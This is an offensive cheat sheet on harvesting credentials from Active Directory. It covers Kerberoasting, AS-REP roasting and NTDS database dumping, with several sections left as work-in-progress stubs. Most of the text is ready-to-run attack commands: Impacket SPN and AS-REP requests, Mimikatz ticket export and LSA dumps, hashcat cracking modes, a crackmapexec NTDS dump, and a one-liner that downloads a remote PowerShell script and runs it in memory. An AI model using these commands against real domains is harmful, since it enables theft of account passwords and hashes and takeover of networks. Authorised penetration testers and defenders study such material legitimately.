# Credentials gathering



**Kerberoast / Kerberoasting**

This vulnerability enables an attacker to access arbitrary services by exploiting the weakness of service account password.

* A domain user is able to request TGS from the DC on arbitrary services, even if it has no access on it.
* The TGS is protected by the NTLM hash of the account password.
* If the password is not strong, the hash could be easily break through bruteforce or wordlist.
* List the Service Principal Name (SPN):
  * GetUserSPNs Powershell script: `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1')`
  * Impacket: `./GetUserSPNs.py -dc-ip <DOMAINCONTROLLERIP> <DOMAIN>`
    * `/opt/Selection_Outils/SMB/impacket/examples/GetUserSPNs.py <DOMAIN>/<USER>:<PWD> -dc-ip <DC-IP>`
* List of Kerberos tickets that exist in memory:
  * On the CMD & PS: `klist`
  * Meterpreter: `load kiwi` then `kerberos_ticket_list`. Or `kiwi_cmd kerberos::list`
  * Mimikatz: `kerberos::list /export`
  * PowerSploit: `Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export" exit'`
* Request the SPN:
  * Impacket: `./GetUserSPNs.py -dc-ip <DOMAINCONTROLLERIP> <DOMAIN>` the output is formatted for `JohnTheRipper` or `Hashcat`
  * Impacket for windows `GetUserSPNs.exe -dc-ip <DOMAINCONTROLLERIP> <FULLDOMAINNAME>/<USER>:<PASSWORD>`
  * Mimikatz: `kerberos::ask /target:<SPN>`
* Break the ticket:
  * JohnTheRipper: WiP
  * Hashcat: `hashcat -m 13100 -a 0 <REQUESTSPNOUTPUT>`

***



**KRB\_AS\_REP Roasting**

Possible de désactiver la nécessité d’authentification sur certain compte de domaine à la demande d’un TGT

* Impacket : `GetNPUsers.py <DOMAIN>/ -usersfile <USER-LIST> -format john -outputfile <FILE-LOG> -dc-ip <IP-KDC>`
  * `john <FILE-LOG> --wordlist=<WORDLIST>`
* Impacket : `GetNPUsers.py <DOMAIN>/ -usersfile <USER-LIST> -format hashcat -outputfile <FILE-LOG> -dc-ip <IP-KDC>`
  * `hashcat -m 18200 -a 0 <FILE-LOG> <WORDLIST> --force`
* `python /opt/Selection_Outils/SMB/impacket/examples/GetNPUsers.py <DOMAIN>/<USER>:<PWD> -outputfile getnpusers.log -dc-ip <IP>`

***



**DCSync**

WiP

***



**Dump NTDS database from de DC**

WiP

* vssadmin WiP
* wmic WiP
* With crackmapexec: `sudo crackmapexec smb <IP> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --ntds drsuapi`
* With PowerSploit:
  * `Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -RemoteDestination "<PATH>\ntds.dit" -ComputerName "<REMOTESERVER>"`
  * `Invoke-Mimikatz -Command '"privilege::debug" "LSADump:LSA /inject"' -Computer <COMPUTERNAME>`
* With metasploit: `use auxiliary/admin/smb/psexec_ntdsgrab`
* Extract and break the hashes
* WiP (esedbexport)
* WiP (ntdsxtract, dsusers.py)
* WiP (JTR)
* WiP (pipal.rb)
